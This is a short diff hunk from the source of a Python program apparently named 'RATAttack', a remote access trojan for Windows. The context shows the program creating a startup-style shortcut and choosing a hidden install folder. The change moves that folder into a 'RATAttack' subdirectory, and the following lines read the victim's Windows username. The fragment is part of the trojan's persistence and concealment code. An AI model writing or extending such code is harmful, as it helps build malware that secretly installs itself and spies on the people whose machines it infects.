@@ -44,7 +44,7 @@ if (argv[0]).endswith('.exe'):
 	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
 else:
-	hide_folder = path[0]
+	hide_folder = path[0] + '\\RATAttack'
 
 initi = False
 user = os.environ.get("USERNAME")	# Windows username
